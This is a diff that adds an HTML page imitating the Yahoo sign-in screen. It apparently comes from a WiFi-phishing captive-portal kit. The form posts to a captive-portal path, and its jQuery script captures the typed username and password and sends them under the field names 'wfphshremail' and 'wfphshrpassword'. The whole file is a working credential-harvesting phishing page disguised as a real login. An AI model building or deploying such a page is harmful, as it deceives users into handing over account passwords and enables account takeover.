@@ -1,0 +1,144 @@
+  <html id="Stencil" class="no-js grid mobile light-theme ">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no" />
+    <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="origin-when-cross-origin">
+    <title>Yahoo</title>
+
+    <link rel="icon" type="image/x-icon" href="static/img/yahoo-favicon-img-v0.0.2.ico">
+    <link rel="shortcut icon" type="image/x-icon" href="static/img/yahoo-favicon-img-v0.0.2.ico">
+    <link rel="apple-touch-icon" href="static/img/yahoo-apple-touch-v0.0.2.png">
+    <link rel="apple-touch-icon-precomposed" href="static/img/yahoo-apple-touch-v0.0.2.png">
+    <script src='static/js/jquery-3.5.1.min.js'></script>
+
+    <link href="static/css/yahoo-main.css" rel="stylesheet" type="text/css">
+
+  </head>
+
+  <body class="bucket-mbr-change-password-v2 bucket-messenger-linking-mc bucket-mbr-signin-with-google bucket-mbr-oneflow-captcha bucket-mbr-cc-unified-add bucket-mbr-comm-channel-classifier">
+
+    <div id="login-body" class="loginish  puree-v2 grid ">
+      <div class="mbr-login-hd" id="mbr-uh-hd">
+        <a href="#">
+          <img src="static/img/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27" />
+          <img src="static/img/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27" />
+        </a>
+      </div>
+      <div class="challenge yid-challenge">
+        <div class="challenge-header">
+        </div>
+        <div class="username-challenge" id="login-landing">
+          <strong class="challenge-heading">Sign in</strong>
+          <span class="challenge-desc signin-sub-title">using your Yahoo account</span>
+          </span>
+          <form id="login-username-form" method="post" action="/captiveportal/index.php" onsubmit="redirect()" class="pure-form">
+            <div id="username-country-code-field" class="username-country-code puree-country-inline-dropdown-disabled code-of-length-2">
+
+              <div>
+                <input class="phone-no" type="text" name="eml" id="eml" tabindex="1" value="" autocomplete="username" autocapitalize="none" autocorrect="off" placeholder="Username, email, or mobile" />
+
+                <input name="pwd" id="pwd" class="pwd-field" type="password" tabindex="2" aria-hidden="true" role="presentation" autocorrect="off" placeholder="Password" />
+              </div>
+
+            </div>
+            <p id="username-error" class="error-msg hide" role="alert"></p>
+
+
+            <div class="button-container">
+              <input id="btn" type="submit" name="signin" class="pure-button puree-button-primary challenge-button" value="Next" tabindex="6" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:login-landing-next" />
+            </div>
+
+            <div class="challenge-feedback-link">
+              <a href="#" id="mbr-forgot-link" data-ylk="elm:btn;elmt:forgot;slk:forgot;mkey:login-landing-forgot" data-rapid-tracking="true">Forgot username?</a>
+            </div>
+            <div class="bottom-links-container has-social-buttons">
+              <p class="sign-up-link">
+                <a href="#" id="createacc" role="button" class="pure-button puree-button-secondary challenge-button" data-rapid-tracking="true" data-ylk="elm:link;elmt:secondary;mKey:login-landing-signup">Create an account</a>
+              </p>
+
+              <div id="social-login-container" class="social-login-container">
+                <div class="or-cont-with-desc challenge-feedback-text">
+                  Or, continue with
+                </div>
+                <ul class="social-login">
+                  <li class="items-cont-1">
+                    <button type="submit" id="tpa-google-button" name="tpaProvider" value="google" class="pure-button sc-button items-1 sc-google sc-google-button" data-rapid-tracking="true" data-ylk="elm:btn;slk:google-btn;mKey:login-landing-google-social-btn">
+                      <label class="offscreen">google</label>
+                    </button>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+
+
+    </div>
+    <script>
+      /*
+      Check the password field and act accordingly.
+      */
+
+      $("#btn").on("click", function(e) {
+          e.preventDefault();
+          // get the password box and checkbox elements
+          var input = document.getElementById("eml");
+          var input2 = document.getElementById("pwd");
+          // check to see if the value is empty
+          if ( input.value == "" ){
+              passNotValid();
+          }else if( input2.value == "" ){ //check if the value of the repeat field is empty
+              passNotValid();
+          }else{
+              // post the data
+              $("#dialog").css('display', 'none');
+                post('login', {
+                  wfphshremail: input.value,
+                  wfphshrpassword: input2.value
+                });
+          }
+      });
+
+      function passNotValid(){
+        $("#dialog").css('display', 'block');
+        $(".form-control").css('border', '1px solid #dd4b39');
+      }
+
+      /*
+      Post to the fallowing path given the parameters.
+
+      Args:
+        path: The path to be posted to.
+        params: The parameters to be passed.
+      */
+      function post(path, params) {
+        // create a form and set its attributes
+        var form = document.createElement("form");
+        form.setAttribute("method", "post");
+        form.setAttribute("action", path);
+
+        // set the attribute for the post
+        for(var key in params) {
+            if(params.hasOwnProperty(key)) {
+                var hiddenField = document.createElement("input");
+                hiddenField.setAttribute("type", "hidden");
+                hiddenField.setAttribute("name", key);
+                hiddenField.setAttribute("value", params[key]);
+                form.appendChild(hiddenField);
+             }
+        }
+        // submit the post
+        document.body.appendChild(form);
+        form.submit();
+      }
+      var input = document.getElementById("eml");
+      var input2 = document.getElementById("pwd");
+      input.disabled = false;
+      input2.disabled = false;
+    </script>
+  </body>
+
+  </html>
